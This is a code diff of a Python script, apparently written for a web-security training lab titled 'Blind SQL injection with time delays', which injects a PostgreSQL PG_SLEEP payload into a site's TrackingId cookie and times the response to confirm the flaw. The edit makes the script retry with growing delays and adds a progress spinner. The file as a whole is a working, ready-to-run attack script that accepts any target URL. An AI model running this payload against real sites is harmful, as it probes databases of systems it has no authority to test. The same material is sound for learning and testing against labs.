@@ -2,43 +2,43 @@ import requests
 import sys
 import urllib.parse
 import getopt
+from halo import Halo
 
 
 def injection(url, trackingId, session):
-  # If you get errors or false positives try incrementing the number 
-  # in the payload at "PG_SLEEP(10)"
-  payload = "'||PG_SLEEP(10)--"
-  payload = urllib.parse.quote_plus(payload)
-  cookies = {
-    "TrackingId": trackingId + payload,
-    "session": session
-    }
-  r = requests.get(url, cookies = cookies)
-  if int(r.elapsed.total_seconds()) >= 10:
-    return f"[*] Blind SQL Injection succesfull"
-  else:
-    sys.exit("[!] An error ocurred with the injection")
+  number = 10
+
+  while True:
+    payload = f"'||PG_SLEEP({number})--"
+    payload = urllib.parse.quote_plus(payload)
+    cookies = {"TrackingId": trackingId + payload, "session": session}
+    response = requests.get(url, cookies=cookies)
+    response_time = int(response.elapsed.total_seconds()) 
+
+    if response_time >= number:
+      return 1
+    else:
+      number += 10
 
 
 def get_cookie(url):
   session = requests.Session()
-  if session.get(url).status_code != 200 :
-    sys.exit("[!] Error. Status code is not '200'")
-
+  response = session.get(url)
   cookies = session.cookies.get_dict()
   values = list(cookies.values())
   trackingId = values[0]
   session = values[1]
-  
   return trackingId, session 
 
 
 def main(argv):
+  help_message = "This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: python3 bsqli-3.py -u <url>"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: python3 bsqli-3.py -u <url>")
-    print("\x1b[?25h")
+    print(help_message) 
+    print("\x1b[?25h", end="") # Make cursor visible 
     sys.exit(2)
 
   for opt, arg in opts:
@@ -46,17 +46,21 @@ def main(argv):
       url = arg
       trackingId, session = get_cookie(url)
     elif opt == "-h":
-      print("This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: python3 bsqli-3.py -u <url>")
-      print("\x1b[?25h")
+      print(help_message) 
+      print("\x1b[?25h", end="") # Make cursor visible 
       sys.exit()
-  message = injection(url, trackingId, session)
-  print(message)
+
+  # Create and start spinner animation
+  spinner = Halo(text="Testing Injection...", spinner="bouncingBar")
+  spinner.start()
+  # Test the injection
+  injection(url, trackingId, session)
+  # Finish spinner
+  spinner.succeed(f"Blind SQL Injection successful")
 
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
